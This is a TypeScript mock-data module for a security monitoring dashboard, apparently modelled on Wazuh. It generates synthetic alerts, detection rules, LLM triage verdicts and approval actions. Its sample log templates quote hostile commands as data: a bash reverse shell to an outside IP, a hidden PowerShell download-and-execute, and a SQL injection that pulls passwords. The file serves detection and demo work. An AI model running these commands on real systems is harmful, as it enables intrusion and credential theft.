import { chance, pick, rint, weightedPick } from '@/utils/rand'
import type {
  ActionRecord,
  ActionStatus,
  Alert,
  AlertSource,
  AuditEntry,
  Dashboard,
  HitRule,
  HostStatus,
  NlRuleDraft,
  RelatedFragment,
  RelatedPattern,
  RuleItem,
  Severity,
  Tier,
  Verdict,
} from './types'

/* ================= 常量池（贴近 Wazuh / ATT&CK 真实命名） ================= */

const HOST_POOL = [
  { name: 'svr-web-01', ip: '172.16.5.11', role: 'Web', os: 'linux' as const },
  { name: 'svr-web-02', ip: '172.16.5.12', role: 'Web', os: 'linux' as const },
  { name: 'svr-app-01', ip: '172.16.5.21', role: 'App', os: 'linux' as const },
  { name: 'svr-app-02', ip: '172.16.5.22', role: 'App', os: 'windows' as const },
  { name: 'svr-db-01', ip: '172.16.5.31', role: 'DB', os: 'linux' as const },
  { name: 'svr-db-02', ip: '172.16.5.32', role: 'DB', os: 'linux' as const },
  { name: 'svr-cache-01', ip: '172.16.5.41', role: 'Cache', os: 'linux' as const },
  { name: 'svr-mgmt-01', ip: '172.16.5.51', role: 'Mgmt', os: 'linux' as const },
  { name: 'svr-backup-01', ip: '172.16.5.61', role: 'Backup', os: 'windows' as const },
  { name: 'svr-ci-01', ip: '172.16.5.71', role: 'CI', os: 'linux' as const },
  { name: 'svr-mon-01', ip: '172.16.5.81', role: 'Monitor', os: 'linux' as const },
  { name: 'svr-edge-01', ip: '172.16.5.91', role: 'Edge', os: 'linux' as const },
]
const srcIps = ['103.75.190.21', '45.83.18.110', '185.220.101.6', '91.240.118.74', '198.98.55.12', '23.129.64.150', '172.16.5.7']
const users = ['root', 'app', 'admin', 'backup', 'www-data', 'oracle']
const procs = ['bash', 'python3', 'curl', 'wget', 'powershell.exe', 'java', 'nmap', 'mshta.exe']
const files = ['/tmp/x86_64', '/etc/passwd', '/var/www/html/shell.php', 'C:\\Users\\Public\\payload.exe', '/etc/shadow', '/tmp/agent']

interface Template {
  decoder: string
  family: string
  severity: Severity
  wazuhId: number
  level: number
  groups: string[]
  desc: string
  techs: { id: string; tactic: string }[]
  raw: (h: { ip: string; user: string; proc: string; file: string; agent: string }) => string
  tp?: number
}

const TPLS: Template[] = [
  {
    decoder: 'pam', family: 'Authentication', severity: 'Medium', wazuhId: 5501, level: 5,
    groups: ['pam', 'authentication_failed'], desc: 'PAM: 用户多次登录失败',
    techs: [{ id: 'T1110', tactic: 'Credential Access' }],
    raw: (h) => `useradd[1234]: pam_unix(${h.proc}:auth): authentication failure; logname= uid=0 euid=0 tty=pts/0 ruser=${h.user} rhost=${h.ip}`,
  },
  {
    decoder: 'auditd', family: 'Sudoers', severity: 'High', wazuhId: 5505, level: 8,
    groups: ['auditd', 'privilege_dropping'], desc: 'auditd: 用户加入了 sudoers',
    techs: [{ id: 'T1078', tactic: 'Privilege Escalation' }],
    raw: (h) => `type=ADD_GROUP msg=audit: group=0 acct="sudoers" exe="/usr/sbin/useradd" hostname=${h.agent} addr=${h.ip} terminal=pts/0 res=success`,
  },
  {
    decoder: 'auditd', family: 'Auditd', severity: 'High', wazuhId: 5115, level: 9,
    groups: ['auditd', 'user_added'], desc: 'auditd: 新增用户账户',
    techs: [{ id: 'T1136', tactic: 'Persistence' }],
    raw: (h) => `type=ADD_USER msg=audit: pid=1234 uid=0 auid=4294967295 ses=4294967295 msg='op=adding user id=1005 exe="/usr/sbin/useradd" hostname=${h.agent} addr=${h.ip} terminal=pts/0 res=success'`,
  },
  {
    decoder: 'syscheck', family: 'File Integrity', severity: 'Medium', wazuhId: 554, level: 7,
    groups: ['syscheck'], desc: 'syscheck: 关键文件被修改',
    techs: [{ id: 'T1565', tactic: 'Impact' }],
    raw: (h) => `File '${h.file}' changed on ${h.agent}. Old md5sum: 'd41d8cd98f00b204e9800998ecf8427e' New md5sum: '098f6bcd4621d373cade4e832627b4f6'`,
  },
  {
    decoder: 'auditd', family: 'Execution', severity: 'High', wazuhId: 5012, level: 10,
    groups: ['auditd', 'execution'], desc: 'auditd: 可疑命令执行',
    techs: [{ id: 'T1059', tactic: 'Execution' }],
    raw: (h) => `type=EXECVE msg=audit: argc=3 a0="${h.proc}" a1="-c" a2="bash -i >& /dev/tcp/${h.ip}/4444 0>&1"`,
  },
  {
    decoder: 'suricata', family: 'Webshell', severity: 'Critical', wazuhId: 31166, level: 15,
    groups: ['suricata', 'ids'], desc: 'Suricata: 检测到 Webshell 访问',
    techs: [{ id: 'T1505.003', tactic: 'Persistence' }, { id: 'T1190', tactic: 'Initial Access' }],
    raw: (h) => `ET WEB_SPECIFIC_APPS Possible WebShell - ${h.file} accessed from ${h.ip} on ${h.agent}`,
    tp: 0.92,
  },
  {
    decoder: 'sysmon', family: 'Process', severity: 'High', wazuhId: 92050, level: 12,
    groups: ['sysmon', 'process_creation'], desc: 'Sysmon: 可疑进程创建',
    techs: [{ id: 'T1055', tactic: 'Defense Evasion' }, { id: 'T1218', tactic: 'Defense Evasion' }],
    raw: (h) => `Image: C:\\Windows\\System32\\${h.proc}  CommandLine: ${h.proc} -enc JABjAGwAaQBlAG4AdAA  User: ${h.user}  ParentImage: svchost.exe (${h.agent})`,
    tp: 0.8,
  },
  {
    decoder: 'sysmon', family: 'Network', severity: 'High', wazuhId: 92002, level: 11,
    groups: ['sysmon', 'network_connection'], desc: 'Sysmon: 进程外联可疑 IP',
    techs: [{ id: 'T1071', tactic: 'Command and Control' }],
    raw: (h) => `Image: ${h.proc}  Source: ${h.agent}:54521  DestHost: ${h.ip}:443  Protocol: tcp  Initiated: true`,
    tp: 0.85,
  },
  {
    decoder: 'sysmon', family: 'File', severity: 'High', wazuhId: 92051, level: 13,
    groups: ['sysmon', 'file_creation'], desc: 'Sysmon: 可疑文件落盘',
    techs: [{ id: 'T1105', tactic: 'Command and Control' }],
    raw: (h) => `File created: ${h.file}  Image: ${h.proc}  User: ${h.user}  Hash: SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822C (${h.agent})`,
    tp: 0.78,
  },
  {
    decoder: 'sshd', family: 'Brute Force', severity: 'Medium', wazuhId: 5710, level: 5,
    groups: ['sshd', 'authentication_failed'], desc: 'sshd: 连续认证失败（暴力破解）',
    techs: [{ id: 'T1110', tactic: 'Credential Access' }],
    raw: (h) => `Received disconnect from ${h.ip}: 11: Bye Bye [preauth] (${h.agent})`,
  },
  {
    decoder: 'auditd', family: 'Auditd', severity: 'Critical', wazuhId: 5155, level: 14,
    groups: ['auditd', 'audit_policy'], desc: 'auditd: 审计日志被清空',
    techs: [{ id: 'T1070.001', tactic: 'Defense Evasion' }],
    raw: (h) => `type=KERNEL msg=audit: op=clear auid=${h.user} hostname=${h.agent} exe="/usr/bin/truncate" terminal=pts/0 res=success`,
    tp: 0.9,
  },
  {
    decoder: 'sysmon', family: 'Powershell', severity: 'High', wazuhId: 92001, level: 10,
    groups: ['sysmon', 'powershell'], desc: 'Sysmon: PowerShell 可疑参数（下载执行）',
    techs: [{ id: 'T1059.001', tactic: 'Execution' }],
    raw: (h) => `Image: powershell.exe  CommandLine: powershell.exe -NoP -sta -NonI -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://${h.ip}/a')  (${h.agent})`,
    tp: 0.88,
  },
  {
    decoder: 'web', family: 'Web Attack', severity: 'High', wazuhId: 31162, level: 11,
    groups: ['web', 'ids'], desc: 'Web: SQL 注入攻击尝试',
    techs: [{ id: 'T1190', tactic: 'Initial Access' }],
    raw: (h) => `${h.ip} - - "GET /search?q=1' UNION SELECT username,password FROM users-- HTTP/1.1" 200 - (${h.agent})`,
    tp: 0.7,
  },
  {
    decoder: 'sshd', family: 'Persistence', severity: 'Critical', wazuhId: 5772, level: 15,
    groups: ['sshd', 'persistence'], desc: 'sshd: 添加了新的授权密钥',
    techs: [{ id: 'T1098.004', tactic: 'Persistence' }],
    raw: (h) => `New authorized_keys entry added by ${h.user} from ${h.ip} on ${h.agent}: ssh-rsa AAAAB3NzaC1yc2E...backdoor@host`,
    tp: 0.95,
  },
]

const PATTERNS = [
  { id: 'P-0001', title: '失效凭据横向移动', hits: 47, confidence: 0.86 },
  { id: 'P-0002', title: '落地即外联的恶意载荷', hits: 33, confidence: 0.9 },
  { id: 'P-0003', title: '审计日志被清除前奏', hits: 21, confidence: 0.83 },
  { id: 'P-0004', title: 'webshell 上传+访问组合', hits: 18, confidence: 0.91 },
  { id: 'P-0005', title: '批量爆破成功后提权', hits: 26, confidence: 0.78 },
  { id: 'P-0006', title: 'cron/计划任务持久化', hits: 14, confidence: 0.8 },
  { id: 'P-0007', title: 'SMB 内网扫描探测', hits: 39, confidence: 0.75 },
  { id: 'P-0008', title: '隐藏后门账号建立', hits: 12, confidence: 0.88 },
]

/* ================= 状态 ================= */

let seq = 100000
const nextId = (p: string) => `${p}-${++seq}`

const hosts: HostStatus[] = HOST_POOL.map((h, i) => ({
  ...h,
  status: i === 5 ? 'degraded' : i === 8 ? 'offline' : 'online',
  lastSeen: Date.now() - rint(3, 300_000),
  alertToday: 0,
}))

const manualRules: RuleItem[] = []
const derivedRules: RuleItem[] = []
let rulesTick = 0

/** 构造规则（模拟种子：人工规则来自安全团队，衍生规则由「可疑模式→LLM 编译」自动生成） */
function mkRule(p: {
  ruleType: 'manual' | 'derived'
  name: string
  description: string
  severity: Severity
  expr: string
  tier: Tier
  allow?: string[]
  sourcePatternId?: string
  confidence?: number
}): RuleItem {
  rulesTick += 1
  const created = Date.now() - rint(10, 45) * 86_400_000
  const isAuto = p.ruleType === 'derived'
  return {
    ruleId: p.ruleType === 'manual' ? `M-${String(400 + rulesTick).padStart(4, '0')}` : `D-${String(100 + rulesTick).padStart(4, '0')}`,
    ruleType: p.ruleType,
    name: p.name,
    description: p.description,
    enabled: true,
    state: 'active',
    severity: p.severity,
    expression: p.expr,
    actionPolicy: { maxTier: p.tier, allow: p.allow ?? [] },
    sourcePatternId: p.sourcePatternId,
    confidence: p.confidence,
    hits: p.confidence ? rint(12, 60) : undefined,
    firedTimes: rint(60, 900),
    series: Array.from({ length: 24 }, () => rint(0, 12)),
    lastTriggeredAt: Date.now() - rint(1, 90) * 60_000,
    owner: isAuto ? 'system' : '安全员-陈工',
    createdAt: created,
    updatedAt: created,
    revision: 1,
    audit: [{ ts: created, op: isAuto ? 'system.compile' : 'human.create', by: isAuto ? 'system' : '安全员-陈工', note: isAuto ? '由可疑模式自动编译生成' : '人工录入' }],
    auto: isAuto,
  }
}

manualRules.push(
  mkRule({ ruleType: 'manual', name: 'PAM 连续登录失败', description: '同一来源 5 分钟内连续 ≥5 次 ssh/pam 认证失败，可能暴力破解。', severity: 'Medium', expr: '{"field":"decoder","op":"in","value":["pam","sshd"]} AND rule.level>=5 AND count(5m)>=5', tier: 'A1', allow: ['snapshot'] }),
  mkRule({ ruleType: 'manual', name: 'Webshell 访问命中', description: 'IDS/Web 引擎报告 webshell 特征访问即告警。', severity: 'Critical', expr: '{"field":"rule.id","op":"in","value":[31166]}', tier: 'A2', allow: ['suppress'] }),
  mkRule({ ruleType: 'manual', name: '新用户/授权密钥添加', description: 'auditd 用户新增或 sshd authorized_keys 变更，需核查是否后门。', severity: 'Critical', expr: 'rule.groups contains auditd/user_added OR rule.id in [5155,5772]', tier: 'A3', allow: ['block_ip', 'isolate'] }),
  mkRule({ ruleType: 'manual', name: '审计日志清空', description: 'auditd 日志被 truncate 清空属高危破坏痕迹行为。', severity: 'Critical', expr: '{"field":"rule.id","op":"in","value":[5155]}', tier: 'A3', allow: ['isolate'] }),
  mkRule({ ruleType: 'manual', name: 'Sysmon 可疑进程创建', description: 'mshta/powershell -enc/wscript 等降级与混淆启动特征。', severity: 'High', expr: 'decoder=sysmon AND rule.level>=12', tier: 'A2', allow: ['snapshot', 'suppress'] }),
  mkRule({ ruleType: 'manual', name: '数据库服务器异常登录', description: 'DB 主机在非业务时段出现 root/本地账户登录。', severity: 'High', expr: 'agent.name startsWith svr-db AND time in [02:00,06:00]', tier: 'A1', allow: ['query'] }),
  mkRule({ ruleType: 'manual', name: '横向外联可疑 IP', description: '主机进程主动外联威胁情报库中可疑 IP:443。', severity: 'High', expr: 'sysmon network_connection AND dst in IOC_List', tier: 'A3', allow: ['block_ip'] }),
  mkRule({ ruleType: 'manual', name: 'SQL 注入尝试', description: 'URL 参数携带 union/报错注入特征。', severity: 'High', expr: '{"field":"family","op":"eq","value":"Web Attack"}', tier: 'A1', allow: ['query'] }),
)

derivedRules.push(
  mkRule({ ruleType: 'derived', name: '[衍] 爆破后新凭据复用', description: '同一源 IP 爆破成功后短时内出现新会话并横向登录，关联 P-0005。', severity: 'High', expr: 'cluster(brute_then_login, 15m) FROM P-0005', tier: 'A1', sourcePatternId: 'P-0005', confidence: 0.78 }),
  mkRule({ ruleType: 'derived', name: '[衍] webshell 上传访问链', description: 'wazuh 文件告警 + IDS webshell 访问同主机同窗口组合，关联 P-0004。', severity: 'Critical', expr: 'cooccur(syscheck_file, 31166, 10m)', tier: 'A2', sourcePatternId: 'P-0004', confidence: 0.91 }),
  mkRule({ ruleType: 'derived', name: '[衍] 载荷落盘后外联', description: '可疑文件落盘后在 5 分钟内发起加密外联，对应 P-0002。', severity: 'Critical', expr: 'follow(susp_file, net_conn, 5m)', tier: 'A3', allow: ['block_ip', 'isolate'], sourcePatternId: 'P-0002', confidence: 0.9 }),
  mkRule({ ruleType: 'derived', name: '[衍] 清日志前置排查', description: '审计清空前 30 分钟内存在进程注入/提权迹象，对应 P-0003。', severity: 'High', expr: 'before(5155, T1055, 30m)', tier: 'A1', sourcePatternId: 'P-0003', confidence: 0.83 }),
  mkRule({ ruleType: 'derived', name: '[衍] 定时任务后门回连', description: 'cron 新增任务触发外部回连，对应 P-0006。', severity: 'High', expr: 'cron_task + c2_beacon', tier: 'A2', sourcePatternId: 'P-0006', confidence: 0.8 }),
  mkRule({ ruleType: 'derived', name: '[衍] 周末内网扫描', description: '非工作时间大规模内网端口扫描，对应 P-0007。', severity: 'Medium', expr: 'scan_net(>/=50 hosts)', tier: 'A1', sourcePatternId: 'P-0007', confidence: 0.75 }),
)

const verdictModels = ['deepseek-chat', 'gpt-4o', 'qwen-max']

const alerts: Alert[] = []

let actionSeq = 0
const actions: ActionRecord[] = []
const mkAction = (p: Partial<ActionRecord> & { name: string; tier: Tier }): ActionRecord => {
  actionSeq += 1
  return {
    actionId: `ACT-${String(90000 + actionSeq)}`,
    alertId: '',
    ruleId: '',
    status: 'pending',
    ts: Date.now(),
    ...p,
  }
}

function buildVerdict(t: Template, sev: Severity, tp: number): Verdict {
  const cls = chance(tp) ? 'TP' : 'FP'
  const model = pick(verdictModels)
  const priority = cls === 'TP' ? sev : 'Low'
  const why = cls === 'TP'
    ? `规则命中且行为链完整：${t.desc}，命中技术 ${t.techs[0].id}，无运维白名单冲突，建议按 ${sev} 处置。`
    : '与白名单运维行为一致（同源/同主机存在例行任务），判定误报，已建议降噪。'
  return { classification: cls, priority, justification: why, model, reviewedBy: 'AutoTriage@LLM' }
}

function hitRuleRef(sev: Severity, ruleType: 'manual' | 'derived'): HitRule {
  const pool = ruleType === 'manual' ? manualRules : derivedRules
  const r = weightedPick(pool.map((x) => ({ value: x, weight: x.severity === sev ? 5 : 1 })))
  return { ruleId: r.ruleId, ruleType: r.ruleType, name: r.name, firedTimes: r.firedTimes, severity: r.severity, maxTier: r.actionPolicy.maxTier }
}

/** 由模板生成一条 Alert */
function genAlert(ts: number, source: AlertSource, tpl?: Template): Alert {
  const t = tpl ?? weightedPick(TPLS.map((x) => ({ value: x, weight: x.severity === 'Low' ? 1 : 1 })))
  const hp = pick(HOST_POOL)
  const h = {
    ip: chance(0.7) ? pick(srcIps) : '127.0.0.1',
    user: pick(users),
    proc: pick(procs),
    file: pick(files),
    agent: hp.name,
  }
  const sev = t.severity
  const needsVerdict = chance(t.tp ? 0.95 : 0.4)
  const hitRules: HitRule[] = [hitRuleRef(sev, 'manual')]
  if (chance(0.35)) hitRules.push(hitRuleRef(sev, 'derived'))
  const id = nextId('A')
  const verdict = needsVerdict ? buildVerdict(t, sev, t.tp ?? 0.55) : null
  const fr: RelatedFragment[] = Array.from({ length: rint(1, 3) }, () => ({
    fragmentId: nextId('F'),
    summary: `${t.family} 摘要：${t.desc}（主机 ${hp.name}）`,
    ts: ts - rint(0, 600_000),
  }))
  const rp: RelatedPattern[] = chance(0.7)
    ? Array.from({ length: rint(1, 2) }, () => {
        const p = pick(PATTERNS)
        return { patternId: p.id, title: p.title, hits: p.hits + rint(0, 5), confidence: p.confidence }
      })
    : []
  return {
    id,
    ts,
    source,
    agent: { name: hp.name, ip: hp.ip, os: hp.os },
    decoder: t.decoder,
    family: t.family,
    severity: sev,
    raw: t.raw(h),
    rule: {
      id: t.wazuhId,
      level: t.level,
      groups: t.groups,
      description: t.desc,
      mitreTechniques: t.techs.map((x) => x.id),
      mitreTactics: t.techs.map((x) => x.tactic),
    },
    verdict,
    status: verdict ? (chance(0.7) ? 'reviewed' : 'open') : 'open',
    hitRules,
    relatedPatterns: rp,
    relatedFragments: fr,
    actionIds: [],
  }
}

function bumpRule(alert: Alert) {
  for (const hr of alert.hitRules) {
    const r = [...manualRules, ...derivedRules].find((x) => x.ruleId === hr.ruleId)
    if (r) {
      r.firedTimes += 1
      r.lastTriggeredAt = alert.ts
      r.series[23] = (r.series[23] ?? 0) + 1
    }
  }
}

function touchHost(alert: Alert) {
  const host = hosts.find((x) => x.name === alert.agent.name)
  if (host) {
    host.lastSeen = Date.now()
    host.alertToday += 1
  }
}

/** 为高/严重告警生成 A3 动作（pending）或已完成动作 */
function maybeGenAction(alert: Alert, pending: boolean) {
  if (alert.severity !== 'High' && alert.severity !== 'Critical') return
  const host = alert.agent
  const candidates = [
    { name: `封禁来源 IP ${host.ip}`, tier: 'A3' as Tier },
    { name: `隔离主机 ${host.name}`, tier: 'A3' as Tier },
    { name: `采集进程快照 ${host.name}`, tier: 'A1' as Tier },
    { name: `抑制同类告警 ${alert.family}`, tier: 'A2' as Tier },
  ]
  if (alert.severity === 'Critical' && chance(0.75)) {
    const c = chance(0.5) ? candidates[0] : candidates[1]
    const rec = mkAction({ name: c.name, tier: c.tier, alertId: alert.id, ruleId: alert.hitRules[0]?.ruleId ?? '', status: pending ? 'pending' : pick<ActionStatus>(['done', 'done', 'done', 'denied']) })
    if (rec.status === 'pending') rec.updatedAt = undefined
    else {
      rec.approvedBy = pick(['安全员-陈工', '安全员-王工'])
      rec.result = rec.status === 'done' ? '执行成功（已下发防火墙/EDR 指令）' : '审批拒绝：与变更窗口重合'
      rec.updatedAt = alert.ts + rint(5, 90) * 1000
    }
    actions.push(rec)
    alert.actionIds.push(rec.actionId)
  }
}

/** 初始数据集：最近 48h 生成告警（波动曲线：白天高、凌晨低、爆破事件突刺） */
function seedAlerts() {
  const now = Date.now()
  for (let hourAgo = 47; hourAgo >= 0; hourAgo--) {
    const hourStart = now - hourAgo * 3_600_000
    const dayFactor = 1 + 0.9 * Math.sin(((24 - hourAgo) / 24) * Math.PI) // 峰在白班
    const spike = hourAgo === 26 || hourAgo === 9 || hourAgo === 3 ? rint(30, 60) : 0
    const base = Math.round(rint(14, 30) * dayFactor + spike)
    for (let k = 0; k < base; k++) {
      const ts = Math.min(hourStart + rint(0, 3_599_000), now - rint(2, 30) * 1000)
      const a = genAlert(ts, weightedPick<AlertSource>([
        { value: 'wazuh', weight: 5 },
        { value: 'replay', weight: 3 },
        { value: 'eval', weight: 1 },
      ]))
      alerts.push(a)
      touchHost(a)
      bumpRule(a)
      maybeGenAction(a, chance(0.25))
    }
  }
  alerts.sort((x, y) => y.ts - x.ts)
}

init()

function init() {
  seedAlerts()
}

/* ================= 对外只读查询 ================= */

const sortBy = (arr: Alert[]) => [...arr].sort((a, b) => b.ts - a.ts)

function windowStats(hours: number, offsetHours = 0) {
  const end = Date.now() - offsetHours * 3_600_000
  const start = end - hours * 3_600_000
  return alerts.filter((a) => a.ts >= start && a.ts <= end)
}

export function getHosts(): HostStatus[] {
  return [...hosts]
}

export function getAlertsPage(params: {
  keyword?: string
  severity?: Severity | ''
  verdict?: string
  source?: string
  status?: string
  page: number
  size: number
}) {
  const kw = (params.keyword ?? '').trim().toLowerCase()
  let list = sortBy(alerts)
  if (kw) {
    list = list.filter((a) =>
      [a.id, a.agent.name, a.agent.ip, a.agent.os, a.decoder, a.family, a.rule.description, a.raw, a.rule.mitreTechniques.join(',')]
        .join(' ').toLowerCase().includes(kw),
    )
  }
  if (params.severity) list = list.filter((a) => a.severity === params.severity)
  if (params.verdict === 'TP') list = list.filter((a) => a.verdict?.classification === 'TP')
  else if (params.verdict === 'FP') list = list.filter((a) => a.verdict?.classification === 'FP')
  else if (params.verdict === 'unknown') list = list.filter((a) => !a.verdict)
  if (params.source) list = list.filter((a) => a.source === params.source)
  if (params.status) list = list.filter((a) => a.status === params.status)
  const total = list.length
  const startIdx = (params.page - 1) * params.size
  return { total, items: list.slice(startIdx, startIdx + params.size) }
}

export function getAlert(id: string): Alert | null {
  return alerts.find((a) => a.id === id) ?? null
}

/** 人工复核：确认为威胁 / 误报（写 verdict + status） */
export function reviewAlert(id: string, cls: 'TP' | 'FP') {
  const a = alerts.find((x) => x.id === id)
  if (!a) return null
  const tp = cls === 'TP'
  a.verdict = {
    classification: cls,
    priority: tp ? a.severity : 'Low',
    justification: tp
      ? '人工复核：命中规则与行为链证据充分，确认威胁并保留原级别，动作策略不变。'
      : '人工复核：与白名单/例行运维行为一致，判定误报并回传规则引擎做降噪。',
    model: 'human@review',
    reviewedBy: '安全员-陈工',
  }
  a.status = 'reviewed'
  return a
}

export function getRules(ruleType?: 'manual' | 'derived') {
  const all = [...manualRules, ...derivedRules]
  const arr = ruleType ? all.filter((r) => r.ruleType === ruleType) : all
  return [...arr].sort((a, b) => b.firedTimes - a.firedTimes)
}

export function setRuleEnabled(ruleId: string, enabled: boolean) {
  const r = [...manualRules, ...derivedRules].find((x) => x.ruleId === ruleId)
  if (!r) return null
  r.enabled = enabled
  r.state = enabled ? 'active' : 'paused'
  r.updatedAt = Date.now()
  r.revision += 1
  r.audit.push({ ts: Date.now(), op: enabled ? 'enable' : 'disable', by: '安全员-陈工', note: `人工${enabled ? '启用' : '停用'}规则` })
  return r
}

export function setDerivedFrozen(ruleId: string, frozen: boolean) {
  const r = derivedRules.find((x) => x.ruleId === ruleId)
  if (!r) return null
  r.state = frozen ? 'paused' : 'active'
  r.updatedAt = Date.now()
  r.revision += 1
  r.audit.push({ ts: Date.now(), op: frozen ? 'human.freeze' : 'human.unfreeze', by: '安全员-陈工', note: frozen ? '人工冻结，暂停自动演化' : '解除冻结' })
  return r
}

export function evolveSwitch(): { on: boolean } {
  return { on: evolutionEnabled }
}

export function getActions(status?: ActionStatus | '') {
  const arr = status ? actions.filter((a) => a.status === status) : actions
  return [...arr].sort((a, b) => b.ts - a.ts)
}

export function decideApproval(actionId: string, approved: boolean, by: string) {
  const rec = actions.find((a) => a.actionId === actionId)
  if (!rec) return null
  rec.status = approved ? 'done' : 'denied'
  rec.approvedBy = by
  rec.result = approved ? '审批通过，动作执行成功（已下发防火墙/EDR 指令）' : '审批拒绝：安全策略变更窗口内不允许该动作'
  rec.updatedAt = Date.now()
  return rec
}

export function buildDashboard(): Dashboard {
  const now = Date.now()
  const last24 = windowStats(24)
  const d = new Date(now)
  const startOfToday = new Date(d.getFullYear(), d.getMonth(), d.getDate()).getTime()
  const todayAlerts = alerts.filter((a) => a.ts >= startOfToday)

  const hourly: Dashboard['hourly'] = []
  for (let i = 23; i >= 0; i--) {
    const end = now - i * 3_600_000
    const start = end - 3_600_000
    const hd = new Date(end)
    hourly.push({
      label: `${String(hd.getHours()).padStart(2, '0')}:00`,
      ts: end,
      cur: alerts.filter((a) => a.ts >= start && a.ts <= end).length,
      prev: alerts.filter((a) => a.ts >= start - 3_600_000 && a.ts <= end - 3_600_000).length,
    })
  }

  const sevCount = (s: Severity) => todayAlerts.filter((a) => a.severity === s).length
  const sevDist: Dashboard['sevDist'] = ['Low', 'Medium', 'High', 'Critical'].map((s) => ({ severity: s as Severity, count: sevCount(s as Severity) }))

  const decoderMap = new Map<string, number>()
  last24.forEach((a) => decoderMap.set(a.decoder, (decoderMap.get(a.decoder) ?? 0) + 1))
  const decoderDist = [...decoderMap.entries()].map(([name, count]) => ({ name, count })).sort((a, b) => b.count - a.count)

  const ruleHitMap = new Map<string, number>()
  last24.forEach((a) => a.hitRules.forEach((hr) => ruleHitMap.set(hr.ruleId, (ruleHitMap.get(hr.ruleId) ?? 0) + 1)))
  const topRules = getRules()
    .map((r) => ({ ...r, hits24: ruleHitMap.get(r.ruleId) ?? 0 }))
    .sort((a, b) => b.hits24 - a.hits24 || b.firedTimes - a.firedTimes)
    .slice(0, 10)

  const pendingApprovals = actions.filter((a) => a.status === 'pending').length

  return {
    overview: {
      todayTotal: todayAlerts.length,
      critical: sevCount('Critical'),
      high: sevCount('High'),
      medium: sevCount('Medium'),
      low: sevCount('Low'),
      openReview: alerts.filter((a) => a.status === 'open').length,
      pendingApprovals,
      hostsTotal: hosts.length,
      hostsOnline: hosts.filter((h) => h.status === 'online').length,
      rulesActive: getRules().filter((r) => r.enabled && r.state === 'active').length,
      firedToday: todayAlerts.reduce((s, a) => s + a.hitRules.length, 0),
      tpToday: alerts.filter((a) => a.verdict?.classification === 'TP').length,
      fpToday: alerts.filter((a) => a.verdict?.classification === 'FP').length,
    },
    hourly,
    sevDist,
    decoderDist,
    topRules,
    hosts: getHosts(),
    recentAlerts: last24.slice(0, 30),
  }
}

/* ================= 实时流（模拟 WebSocket 推送） ================= */

export type FeedKind = 'alert' | 'rule-update' | 'approval'
export interface FeedEvent {
  kind: FeedKind
  alert?: Alert
  rule?: RuleItem
  created?: boolean
}

let feedStarted = false
const listeners = new Set<(e: FeedEvent) => void>()

export function subscribeFeed(fn: (e: FeedEvent) => void): () => void {
  listeners.add(fn)
  return () => listeners.delete(fn)
}

function emit(e: FeedEvent) {
  listeners.forEach((fn) => fn(e))
}

let evolutionEnabled = true

function evolveTick() {
  if (!evolutionEnabled || derivedRules.length === 0) return
  const r = pick(derivedRules)
  if (r.state === 'paused') return
  const audit: AuditEntry = { ts: Date.now(), op: 'system.update', by: 'system', note: '' }
  if (chance(0.35)) {
    audit.op = 'system.snapshot'
    audit.note = `按近 24h 命中表现微调权重，置信度 ${(r.confidence ?? 0.7).toFixed(2)} → ${Math.min(0.99, (r.confidence ?? 0.7) + (chance(0.5) ? 0.02 : -0.02)).toFixed(2)}`
    r.confidence = Math.min(0.99, (r.confidence ?? 0.7) + (chance(0.5) ? 0.02 : -0.02))
  } else if (chance(0.4)) {
    audit.op = 'system.merge'
    audit.note = `与模式 ${r.sourcePatternId} 证据合并，规则保持不变`
    r.firedTimes += rint(0, 3)
  } else {
    audit.op = 'system.suppress'
    audit.note = '新增误报反馈，降低优先级并抑制通知'
    r.severity = 'Medium'
  }
  r.updatedAt = Date.now()
  r.revision += 1
  r.audit.push(audit)
  emit({ kind: 'rule-update', rule: r })
}

function feedTick() {
  const now = Date.now()
  const tpl = weightedPick(TPLS.map((x) => ({ value: x, weight: 1 })))
  const a = genAlert(now, 'wazuh', tpl)
  alerts.push(a)
  alerts.sort((x, y) => y.ts - x.ts)
  if (alerts.length > 8000) alerts.length = 8000
  touchHost(a)
  bumpRule(a)
  maybeGenAction(a, chance(0.3))
  emit({ kind: 'alert', alert: a })
  if (actions.some((x) => x.alertId === a.id && x.status === 'pending')) emit({ kind: 'approval', alert: a })
}

export function startFeed() {
  if (feedStarted) return
  feedStarted = true
  setInterval(() => feedTick(), 4200)
  setInterval(() => evolveTick(), 24000)
}

export function toggleEvolution(on: boolean) {
  evolutionEnabled = on
}

/* ================= 人工规则 / NL 助手（Mock 编译） ================= */

export function nlCompile(text: string): NlRuleDraft {
  const low = text.toLowerCase()
  const kw = (s: string) => low.includes(s)
  const severity: Severity = kw('爆破') || kw('登录失败') || kw('扫描') ? 'Medium' : kw('webshell') || kw('后门') || kw('免杀') || kw('清日志') ? 'Critical' : kw('进程') || kw('外联') || kw('注入') ? 'High' : 'Medium'
  const tier: Tier = severity === 'Critical' ? 'A3' : severity === 'High' ? 'A2' : 'A1'
  const name = (kw('连续登录失败') || kw('爆破') ? '爆破类' : kw('webshell') ? 'Webshell 类' : kw('外联') || kw('回连') ? '外联回连类' : kw('提权') || kw('sudo') ? '提权类' : '自定义')
  const ruleIds = kw('auditd') ? '5000-5799' : kw('sysmon') ? '92000-92999' : kw('suricata') || kw('ids') ? '30000-32999' : kw('ssh') || kw('pam') ? '5500-5799' : '1-99999'
  const fieldHits = ['rule.level >= 8', `decoder 命中 ${ruleIds}`, kw('同源') ? '同源 IP 聚合计数 ≥5/5min' : '关键词组任一命中', '无白名单冲突']
  return {
    name: `${name}规则`,
    description: text,
    severity,
    expression: `{"and":[{"field":"decoder","op":"in","value":[...]},{"field":"rule.id","op":"between","value":${ruleIds}},{"field":"msg","op":"match","value":"..."}]}`,
    actionPolicy: { maxTier: tier, allow: tier === 'A3' ? ['block_ip', 'isolate'] : tier === 'A2' ? ['suppress'] : ['snapshot'] },
    summary: `命中审计确认该描述对应「${name}」行为族；建议纳入 ${severity} 级别，策略允许动作到 ${tier}。`,
    fieldHits,
    sampleHits: rint(8, 60),
  }
}

export function createManualRule(draft: NlRuleDraft) {
  const r = mkRule({
    ruleType: 'manual',
    name: draft.name,
    description: draft.description,
    severity: draft.severity,
    expr: draft.expression,
    tier: draft.actionPolicy.maxTier,
    allow: draft.actionPolicy.allow,
  })
  r.state = 'active'
  r.audit[0] = { ts: Date.now(), op: 'human.create_nl', by: '安全员-陈工', note: `自然语言向导创建，样例命中 ${draft.sampleHits} 条` }
  manualRules.push(r)
